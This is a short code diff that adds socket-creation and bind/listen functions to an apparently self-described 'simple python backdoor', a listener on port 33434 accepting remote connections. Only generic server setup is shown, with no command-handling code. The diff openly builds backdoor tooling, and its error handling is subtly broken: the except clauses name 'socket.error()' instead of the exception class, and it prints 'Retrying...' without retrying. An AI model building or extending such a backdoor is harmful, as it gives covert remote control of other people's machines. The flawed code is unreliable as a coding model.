@@ -14,6 +14,26 @@ CHUNKS = 2048
 PORT = 33434
 
 
+def simple_python_backdoor_create_socket():
+    try:
+        object_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        # Reuse a socket even if its recently closed.
+        object_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        return object_socket
+    except socket.error() as str_error:
+        print(f'Error creating socket {str_error}')
+
+
+def simple_python_backdoor_socket_bind(sock):
+
+    try:
+        print(f'Server started and listening on {PORT}...')
+        sock.bind(('', PORT))
+        sock.listen(5)
+    except socket.error() as str_error:
+        print(f'Error binding socket {str_error}.\nRetrying...')
+
+
 def main():
 
     _socket = simple_python_backdoor_create_socket()
